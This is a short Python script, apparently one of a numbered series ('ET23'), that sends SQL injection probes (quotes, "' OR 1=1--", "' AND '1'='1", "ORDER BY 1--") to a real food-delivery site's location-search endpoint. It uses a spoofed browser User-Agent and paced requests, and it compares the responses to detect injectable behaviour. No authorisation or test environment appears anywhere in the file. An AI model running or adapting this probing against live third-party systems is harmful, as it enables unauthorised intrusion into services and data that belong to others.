# -*- coding: utf-8 -*-
"""ET23: SQLi syntax-break probing on /webroutes/location/search (low volume, quote/comment probes)"""
import http.client, ssl, json, time, hashlib

ctx = ssl.create_default_context()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"

def get(p):
    conn = http.client.HTTPSConnection("www.zomato.com", 443, timeout=15, context=ctx)
    conn.request("GET", "/webroutes/location/search" + p, headers={"User-Agent": UA,
                "Accept": "application/json", "X-Requested-With": "XMLHttpRequest"})
    r = conn.getresponse()
    raw = r.read(2000000)
    conn.close()
    return r.status, raw

def analyze(tag, p):
    st, raw = get(p)
    body = raw.decode("utf-8", "replace")
    sig = hashlib.md5(raw).hexdigest()[:10]
    try:
        d = json.loads(body)
        ls = d.get("locationSuggestions")
        n = len(ls) if isinstance(ls, list) else "?"
        first = ""
        if isinstance(ls, list) and ls:
            first = json.dumps(ls[0])[:150]
        err = d.get("status") or d.get("message") or ""
        print("%-10s %-58s [%d] md5=%s n=%s err=%s" % (tag, p, st, sig, n, str(err)[:60]), flush=True)
        if first:
            print("   first: %s" % first, flush=True)
    except Exception as e:
        print("%-10s %-58s [%d] md5=%s RAW: %s" % (tag, p, st, sig, body[:200]), flush=True)

TESTS = [
    ("B0", "?q=delhi"),
    ("B1", "?q=delhi'"),
    ("B2", "?q=delhi''"),
    ("B3", "?q=delhi%22"),
    ("B4", "?q=delhi%27%20OR%201%3D1--"),
    ("B5", "?q=delhi%27%20AND%20%271%27%3D%271"),
    ("B6", "?q=delhi%5C"),
    ("B7", "?q=delhi%20ORDER%20BY%201--"),
]
for tag, p in TESTS:
    analyze(tag, p)
    time.sleep(1.2)
print("done", flush=True)
